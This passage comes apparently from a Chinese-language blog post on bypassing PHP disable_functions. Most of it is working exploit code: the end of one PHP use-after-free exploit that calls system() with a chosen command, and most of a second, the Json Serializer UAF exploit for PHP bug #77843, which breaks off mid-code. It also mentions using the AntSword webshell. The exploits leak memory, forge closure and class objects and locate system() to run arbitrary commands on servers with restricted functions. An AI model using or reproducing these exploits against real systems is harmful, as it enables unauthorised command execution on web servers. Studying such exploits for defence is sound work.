&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$poc</span> = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    <span class="variable">$out</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$poc</span>);</span><br><span class="line">    <span class="title function_ invoke__">gc_collect_cycles</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$v</span> = [];</span><br><span class="line">    <span class="variable">$v</span>[<span class="number">0</span>] = <span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$out</span>[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>修改最顶上的 <code>pwn(&quot;uname -a&quot;);</code> 里面的内容就可修改执行的命令的内容。</p>
<h3 id="payload-–-蚁剑-1"><a href="#payload-–-蚁剑-1" class="headerlink" title="payload – 蚁剑"></a>payload – 蚁剑</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230827174152887.png"
                      alt="image-20230827174152887"
                ></p>
<h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><p><strong>历史报告：</strong><a class="link"   href="https://bugs.php.net/bug.php?id=77843" >PHP :: Bug #77843 :: Use after free with json serializer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><p><a class="link"   href="https://github.com/mm0r1/exploits/blob/master/php-json-bypass/exploit.php" >exploits&#x2F;php-json-bypass&#x2F;exploit.php at master · mm0r1&#x2F;exploits (github.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;id&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">      <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">        <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">8</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">get_class</span>(<span class="variable">$spl1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x18</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$spl1</span>::<span class="variable">$leak</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">jsonSerialize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$y</span>, <span class="variable">$cmd</span>, <span class="variable">$spl1</span>, <span class="variable">$fake_tbl_off</span>, <span class="variable">$n_alloc</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$contiguous</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$contiguous</span>[] = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$room</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$room</span>[] = <span class="keyword">new</span> <span class="title function_ invoke__">Z</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_protector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$y</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protector</span> = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        <span class="variable">$x</span>-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        <span class="variable">$x</span>-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line">        <span class="variable">$spl2</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        <span class="variable">$class_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        <span class="variable">$handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        <span class="variable">$php_heap</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        <span class="variable">$fake_obj</span> = <span class="variable">$abc_addr</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>, <span class="variable">$abc_addr</span>); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak1</span>(<span class="variable">$class_entry</span> + <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        <span class="variable">$fake_tbl_off</span> = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x30</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x38</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$handlers</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span 